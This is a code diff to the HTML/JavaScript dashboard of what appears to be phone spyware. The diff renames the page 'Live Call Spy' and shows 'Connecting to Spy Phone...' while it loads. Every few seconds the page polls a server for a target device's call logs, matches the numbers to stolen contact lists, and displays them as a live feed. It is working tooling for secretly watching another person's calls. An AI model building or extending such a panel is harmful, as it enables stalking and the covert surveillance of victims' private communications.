@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Live Call History</title>
+    <title>Live Call Spy</title>
     <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
     <style>
         :root {
@@ -37,9 +37,11 @@
 
         .header {
             display: flex; justify-content: space-between; align-items: center;
-            margin-bottom: 20px; padding: 0 10px 15px 10px;
+            margin-bottom: 10px; padding: 0 10px 15px 10px;
             border-bottom: 0.5px solid var(--glass-border);
         }
+
+        .header-left { display: flex; align-items: center; gap: 10px; }
 
         .back-btn {
             color: var(--text-main); font-size: 1.1rem;
@@ -49,22 +51,29 @@
 
         .page-title { 
             font-size: 1.1rem; font-weight: 600; letter-spacing: 0.5px;
-            display: flex; align-items: center; gap: 8px;
         }
 
-        /* Live Indicator Dot */
+        /* LIVE STATUS INDICATOR */
+        .live-status {
+            font-size: 0.75rem; color: var(--incoming);
+            display: flex; align-items: center; gap: 6px;
+            background: rgba(48, 209, 88, 0.1);
+            padding: 4px 10px; border-radius: 20px;
+        }
+
         .live-dot {
-            width: 8px; height: 8px; background-color: #30d158;
-            border-radius: 50%; box-shadow: 0 0 10px #30d158;
-            animation: pulse 2s infinite;
+            width: 8px; height: 8px; background-color: var(--incoming);
+            border-radius: 50%;
+            box-shadow: 0 0 8px var(--incoming);
+            animation: pulse 1.5s infinite;
         }
 
         @keyframes pulse {
             0% { opacity: 1; transform: scale(1); }
-            50% { opacity: 0.5; transform: scale(1.2); }
+            50% { opacity: 0.4; transform: scale(1.1); }
             100% { opacity: 1; transform: scale(1); }
         }
-        
+
         .refresh-btn {
             background: transparent; border: none;
             color: var(--text-main); font-size: 1.1rem; cursor: pointer;
@@ -128,17 +137,29 @@
         }
 
         .status-msg { text-align: center; color: var(--text-sub); margin-top: 50px; }
+        
+        /* Debug info hidden by default */
+        .debug-info { font-size: 10px; color: #555; text-align: center; margin-top: 5px; display: none; }
     </style>
 </head>
 <body>
 
     <div class="container">
         <div class="header">
-            <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
-            <span class="page-title"><div class="live-dot"></div> Recents</span>
-            <button onclick="fetchLogs()" class="refresh-btn" id="refreshBtn"><i class="fa-solid fa-rotate"></i></button>
+            <div class="header-left">
+                <a href="index.html" class="back-btn"><i class="fa-solid fa-chevron-left"></i></a>
+                <span class="page-title">Recents</span>
+            </div>
+            
+            <div class="live-status">
+                <div class="live-dot"></div>
+                <span id="liveText">LIVE</span>
+            </div>
+
+            <button onclick="manualRefresh()" class="refresh-btn"><i class="fa-solid fa-rotate"></i></button>
         </div>
 
+        <div class="debug-info" id="debugBox"></div>
         <div class="log-list" id="logsContainer">
             </div>
     </div>
@@ -149,27 +170,39 @@
         const DEVICE_ID = urlParams.get('id');
         const storageKey = `calls_${DEVICE_ID}`;
         let cachedContacts = [];
+        let refreshInterval;
 
         document.addEventListener("DOMContentLoaded", () => {
             if (!DEVICE_ID) {
-                alert("ID Missing! Redirecting...");
+                alert("ID Missing!");
                 window.location.href = "index.html";
                 return;
             }
             
             detectContactsData();
             loadFromStorage();
-            sendCommand();
-
-            // --- LIVE UPDATE LOGIC ---
-            // Pehli baar 2 second baad fetch karo
-            setTimeout(fetchLogs, 2000);
             
-            // Uske baad har 3 second (3000ms) mein auto-update karo
-            setInterval(fetchLogs, 3000); 
+            // First fast command send
+            sendCommand();
+            
+            // Start Loop
+            startLiveUpdates();
         });
 
-        // 1. Contacts Detect
+        function startLiveUpdates() {
+            fetchLogs(); // Immediate fetch
+            // Update every 3 seconds
+            refreshInterval = setInterval(() => {
+                fetchLogs();
+            }, 3000);
+        }
+
+        function manualRefresh() {
+            document.getElementById("liveText").innerText = "Updating...";
+            fetchLogs();
+        }
+
+        // --- 1. SUPER CONTACT DETECTOR ---
         function detectContactsData() {
             try {
                 for (let i = 0; i < localStorage.length; i++) {
@@ -178,7 +211,7 @@
                         const rawData = localStorage.getItem(key);
                         if (rawData) {
                             const parsed = JSON.parse(rawData);
-                            if (Array.isArray(parsed) && parsed.length > 0 && (parsed[0].name || parsed[0].phone)) {
+                            if (Array.isArray(parsed) && parsed.length > 0) {
                                 cachedContacts = parsed;
                                 return;
                             }
@@ -188,14 +221,13 @@
             } catch (e) { console.error("Contacts error", e); }
         }
 
-        // 2. Name Match
         function findContactName(phoneNumber) {
             if (!cachedContacts || cachedContacts.length === 0) return null;
             try {
                 const cleanLogNum = phoneNumber.replace(/\D/g, '').slice(-10); 
                 const match = cachedContacts.find(c => {
-                    if(!c.phone && !c.number) return false;
-                    const contactPhone = c.phone || c.number || "";
+                    const contactPhone = c.phone || c.number || ""; // Handle both keys
+                    if(!contactPhone) return false;
                     const cleanContactNum = contactPhone.toString().replace(/\D/g, '').slice(-10);
                     return cleanContactNum === cleanLogNum;
                 });
@@ -203,49 +235,54 @@
             } catch (e) { return null; }
         }
 
-        // 3. DATE FIXER (Seconds/Milliseconds)
-        function normalizeDate(timestamp) {
-            let timeNum = Number(timestamp);
-            if (isNaN(timeNum)) return 0; 
-            // Agar seconds mein hai (chota number), to ms mein convert karo
-            if (timeNum < 1000000000000) {
-                timeNum = timeNum * 1000;
+        // --- 2. UNIVERSAL DATE FIXER (Ye "Unknown" hatayega) ---
+        function getValidDate(log) {
+            // Server kabhi 'date' bhejta hai, kabhi 'timestamp', kabhi 'time'
+            let raw = log.date || log.timestamp || log.time || log.created_at;
+
+            if (!raw) return null; // Date hi nahi hai
+
+            // Agar date string hai (e.g. "2024-01-01")
+            let dateObj = new Date(raw);
+            if (!isNaN(dateObj.getTime())) return dateObj;
+
+            // Agar date number hai (e.g. 1709876543)
+            let num = Number(raw);
+            if (!isNaN(num)) {
+                // Agar chota number hai (Seconds), to ms bana do
+                if (num < 1000000000000) num *= 1000;
+                return new Date(num);
             }
-            return timeNum;
+
+            return null; // Haar maan li
         }
 
-        // 4. Formatter
-        function formatSmartDate(timestamp) {
-            if (!timestamp) return "Unknown";
-            const ms = normalizeDate(timestamp);
-            if (ms === 0) return "Unknown";
+        function formatSmartDate(dateObj) {
+            if (!dateObj) return "Unknown Date";
 
-            const date = new Date(ms);
             const now = new Date();
             const yesterday = new Date(now);
             yesterday.setDate(yesterday.getDate() - 1);
 
-            const timeStr = date.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
+            const timeStr = dateObj.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
 
-            if (date.toDateString() === now.toDateString()) {
+            if (dateObj.toDateString() === now.toDateString()) {
                 return `Today, ${timeStr}`;
-            } else if (date.toDateString() === yesterday.toDateString()) {
+            } else if (dateObj.toDateString() === yesterday.toDateString()) {
                 return `Yesterday, ${timeStr}`;
             } else {
-                return date.toLocaleDateString() + ", " + timeStr;
+                return dateObj.toLocaleDateString() + ", " + timeStr;
             }
         }
 
+        // --- 3. SERVER LOGIC ---
         function loadFromStorage() {
             const savedData = localStorage.getItem(storageKey);
             if (savedData) {
                 renderLogs(JSON.parse(savedData));
             } else {
                 document.getElementById("logsContainer").innerHTML = `
-                    <div class="status-msg">
-                        <i class="fa-solid fa-spinner fa-spin" style="font-size: 2rem; margin-bottom: 10px;"></i>
-                        <p>Waiting for data...</p>
-                    </div>`;
+                    <div class="status-msg"><p>Connecting to Spy Phone...</p></div>`;
             }
         }
 
@@ -258,33 +295,41 @@
         }
 
         function fetchLogs() {
-            // Timestamp add kiya taaki browser cache na kare purana data
-            fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/call_logs?t=${new Date().getTime()}`)
+            const timestamp = new Date().getTime();
+            fetch(`${SERVER_URL}/api/get-data/${DEVICE_ID}/call_logs?t=${timestamp}`)
                 .then(response => response.json())
                 .then(data => {
-                    if (data && data.length > 0) {
-                        // Purane data se compare kar sakte hain, par safety ke liye update kar rahe hain
+                    // Update header time to show it's LIVE
+                    const timeNow = new Date().toLocaleTimeString([], {hour: '2-digit', minute:'2-digit', second:'2-digit'});
+                    document.getElementById("liveText").innerText = `LIVE (${timeNow})`;
+
+                    if (data && Array.isArray(data) && data.length > 0) {
                         localStorage.setItem(storageKey, JSON.stringify(data));
                         detectContactsData();
                         renderLogs(data);
                     }
                 })
                 .catch(err => {
-                    // Silent fail taaki user disturb na ho
-                    console.log("Auto-update check...");
+                    console.log("Live check...");
+                    document.getElementById("liveText").innerText = "Connecting...";
                 });
         }
 
         function renderLogs(data) {
             const container = document.getElementById("logsContainer");
             if(!container) return;
+
+            // Pre-process dates for sorting
+            data.forEach(log => {
+                log._validDate = getValidDate(log);
+                log._sortTime = log._validDate ? log._validDate.getTime() : 0;
+            });
+
+            // Sort: Latest call first
+            data.sort((a, b) => b._sortTime - a._sortTime);
+
+            let html = "";
             
-            // Sort by Normalized Date
-            data.sort((a, b) => normalizeDate(b.date) - normalizeDate(a.date));
-
-            // Poora HTML rebuild karenge (Live feel ke liye)
-            let htmlContent = "";
-
             data.forEach(log => {
                 const type = (log.type || "").toLowerCase();
                 let iconClass = "incoming";
@@ -292,37 +337,38 @@
                 let isMissed = false;
 
                 if(type.includes("outgoing")) {
-                    iconClass = "outgoing";
-                    iconSymbol = "fa-arrow-up";
+                    iconClass = "outgoing"; iconSymbol = "fa-arrow-up";
                 } else if(type.includes("missed") || type.includes("rejected")) {
-                    iconClass = "missed";
-                    iconSymbol = "fa-xmark";
-                    isMissed = true;
+                    iconClass = "missed"; iconSymbol = "fa-xmark"; isMissed = true;
                 }
 
                 const matchedName = findContactName(log.number);
                 const nameColorClass = isMissed ? "is-missed" : "";
 
+                // Name logic
                 let mainText = matchedName ? matchedName : log.number;
-                let subText = matchedName ? ("Mobile • " + log.number) : "Unsaved";
+                let subText = matchedName ? `Mobile • ${log.number}` : "Unsaved Number";
+                
+                // Icon Logic
                 let mainIcon = matchedName 
-                    ? `<i class="fa-solid fa-user name-icon" style="margin-right:5px;"></i>` 
-                    : `<i class="fa-solid fa-mobile-screen name-icon" style="margin-right:5px;"></i>`;
+                    ? `<i class="fa-solid fa-user name-icon"></i>` 
+                    : `<i class="fa-solid fa-mobile-screen name-icon"></i>`;
 
-                const prettyDate = formatSmartDate(log.date);
+                // Date Logic (Finally fixed)
+                const prettyDate = formatSmartDate(log._validDate);
 
-                htmlContent += `
+                html += `
                     <div class="log-card">
                         <div class="log-icon ${iconClass}">
                             <i class="fa-solid ${iconSymbol}"></i>
                         </div>
                         <div class="log-info">
                             <div class="log-name ${nameColorClass}">
-                                ${mainIcon} ${mainText}
+                                ${mainIcon} &nbsp; ${mainText}
                             </div>
                             <div class="log-details-row">
                                 <span>${subText}</span>
-                                <span>•</span>
+                                <span>&nbsp;•&nbsp;</span>
                                 <span>${prettyDate}</span>
                             </div>
                         </div>
@@ -332,7 +378,7 @@
                     </div>`;
             });
 
-            container.innerHTML = htmlContent;
+            container.innerHTML = html;
         }
     </script>
 </body>
